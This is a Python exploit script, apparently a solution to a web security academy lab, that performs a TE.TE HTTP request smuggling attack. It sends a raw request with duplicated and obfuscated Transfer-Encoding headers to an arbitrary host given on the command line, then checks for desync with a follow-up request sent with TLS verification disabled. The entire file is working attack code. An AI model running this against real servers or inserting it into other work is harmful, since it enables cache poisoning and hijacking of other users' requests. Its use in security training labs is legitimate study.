import sys
import requests
import ssl
import socket
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: HTTP request smuggling, obfuscating the TE header
def TE_TE_TO_TE_CL(target_host, target_port):
    """
    Function to execute the HTTP request smuggling attack by obfuscating the Transfer-Encoding header.
    """
    # Payload explanation:
    # - The 'Transfer-Encoding' header is used to exploit the front-end's behavior.
    # - The second 'Transfer-Encoding: xx' obfuscates the header for the back-end while the front-end processes it normally.
    # - The back-end disregards the two (TE) and utilizes CL instead.
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: xx\r\n"  # Obfuscated TE header
        "\r\n"
        "56\r\n"  # Chunk size in hex (this creates a smuggled request)
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n"  # End of chunked data
        "\r\n"
    )

    # Create an SSL context to establish a secure connection with the server
    ssl_context = ssl.create_default_context()
    with socket.create_connection((target_host, target_port)) as sock:
        with ssl_context.wrap_socket(sock, server_hostname=target_host) as securesock:
            # Send the smuggled payload
            securesock.sendall(payload.encode())
            smuggled_response = securesock.recv(4096)

            # Check if the payload was accepted by the front-end
            if "HTTP/1.1 200 OK" in smuggled_response.decode():
                print("(+) Payload sent successfully.")

                # Send a normal GET request to trigger the smuggled request
                normal_response = requests.get("https://" + target_host, verify=False)
                if "Unrecognized method GPOST" in normal_response.text:
                    print("(+) Request smuggled successfully.")
                    print("(+) Lab solved successfully.")
                    sys.exit()
                else:
                    print("(-) Error: Smuggled request was not executed as expected.")
            elif "504 Gateway Timeout" in smuggled_response.decode():
                # Handle timeout errors, which may indicate that the web site down
                print("(-) No response received from the server.")
                sys.exit(1)
            else:
                # Handle unexpected responses
                print("(-) Unexpected Error occurred.")

def main():
    """
    Entry point of the script. Validates user input and calls the attack function.
    """
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = 443  # Default HTTPS port
    TE_TE_TO_TE_CL(target_host, target_port)

if __name__ == "__main__":
    main()
